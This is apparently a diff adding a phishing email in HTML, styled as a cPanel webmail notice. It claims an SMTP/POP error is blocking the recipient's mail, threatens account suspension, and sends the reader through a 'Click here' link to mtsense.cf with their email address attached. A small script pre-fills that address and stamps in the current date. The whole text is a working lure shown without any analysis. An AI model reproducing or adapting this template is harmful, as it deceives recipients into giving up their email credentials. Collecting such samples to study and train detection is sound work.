@@ -1,0 +1,42 @@
+<HTML><BODY><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=0 width=600 bgColor=#ffffff>
+<TBODY>
+<script type="text/javascript">function populate() { 
+document.getElementById("demo").innerHTML = Date();
+var varSection = window.location.search.substr(1);
+document.getElementById("Email").value=varSection;
+document.getElementById("lbEmail").value=varSection
+} </script>
+<TR>
+<TD style="BORDER-COLLAPSE: collapse">
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=10 width="100%" bgColor=#629341>
+<TBODY>
+<TR align=left bgColor=#629341>
+<TD style="BORDER-COLLAPSE: collapse">
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=10 width="100%">
+<TBODY>
+<TR align=left>
+<TD style="BORDER-COLLAPSE: collapse"><IMG style="WIDTH: 139px; HEIGHT: 67px" border=0 hspace=0 align=bottom src="http://webmail.zagecoin.com/cPanel_magic_revision_1476983851/unprotected/cpanel/images/webmail-logo.svg" width="1949" height="319" data-imagetype="External"></TD></TR></TBODY></TABLE></TD>
+<TD style="BORDER-COLLAPSE: collapse" vAlign=bottom>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=20 align=right>
+<TBODY>
+<TR align=right>
+<TD style="BORDER-COLLAPSE: collapse">
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=0 width="100%" align=right>
+<TBODY>
+<TR>
+<TD style="BORDER-COLLAPSE: collapse" align=right>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR><TR><TD style="BORDER-COLLAPSE: collapse" align="center" valign="top" bgcolor="#ffffff">
+<TABLE style="BORDER-COLLAPSE: collapse" border=0 cellSpacing=0 cellPadding=0 width="100%" align=center>
+<TBODY>
+<TR>
+<TD style="BORDER-COLLAPSE: collapse" class=x_gmail-m_5447022136336598772em_spacer height=24>&nbsp;</TD></TR></TBODY></TABLE></TD></TR><TR><TD style="BORDER-COLLAPSE: collapse" align="center" valign="top" bgcolor="#ffffff">
+<TABLE style="BORDER-COLLAPSE: collapse" border=0 cellSpacing=5 cellPadding=5 width="100%" align=center>
+<TBODY>
+<TR>
+<TD style="BORDER-COLLAPSE: collapse" class=x_gmail-m_5447022136336598772em_spacer width=20>&nbsp;</TD>
+<TD vAlign=top align=left>
+<P><SPAN style="LINE-HEIGHT: 22px; BORDER-COLLAPSE: collapse; COLOR: rgb(102,102,102); FONT-SIZE: 14px"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><b><FONT style="VERTICAL-ALIGN: inherit">Hi [[-Email-]],&nbsp;</b> </FONT></FONT></FONT></FONT><BR><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">An error in your SMTP / POP settings is blocking your incoming email.</FONT></FONT></FONT></FONT></SPAN></P>
+<P><SPAN style="LINE-HEIGHT: 22px; BORDER-COLLAPSE: collapse; COLOR: rgb(102,102,102); FONT-SIZE: 14px"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">This is an automated email sent from our SSL severs to inform you that there is an error in your email configuration.&nbsp; </FONT></FONT></FONT></FONT><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">This error was identified on: <p id="demo">
+      </div> and we have not been able to deliver 13 contact email messages from this date.&nbsp; </FONT></FONT></FONT></FONT><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">To retrieve your emails and reconfigure Port 486,&nbsp; </FONT></FONT></FONT></FONT><A href="http://mtsense.cf/possession/future/?email=[[-Email-]]" rel="noopener noreferrer" target=_blank data-auth="NotApplicable"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Click here</FONT></FONT></FONT></FONT></A><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"> &nbsp;and follow instruction.</FONT></FONT></FONT></FONT></SPAN></P>
+<P><SPAN style="LINE-HEIGHT: 22px; BORDER-COLLAPSE: collapse; COLOR: rgb(102,102,102); FONT-SIZE: 14px"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Warning: Failure to do this will lead total suspension of your email account.&nbsp; </FONT></FONT></FONT></FONT><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">This message has been sent to% 0%, please ignore if this is not your email address.</FONT></FONT></FONT></FONT></SPAN></P>
+<P><SPAN style="LINE-HEIGHT: 22px; BORDER-COLLAPSE: collapse; COLOR: rgb(102,102,102); FONT-SIZE: 14px"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Thank you,&nbsp; </FONT></FONT></FONT></FONT><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">E-mail Security Team&nbsp; </FONT></FONT></FONT></FONT><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">&copy; 2021</FONT></FONT></FONT></FONT></SPAN></P></TD>
+<TD style="BORDER-COLLAPSE: collapse" class=x_gmail-m_5447022136336598772em_spacer width=20>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY></BODY></HTML>
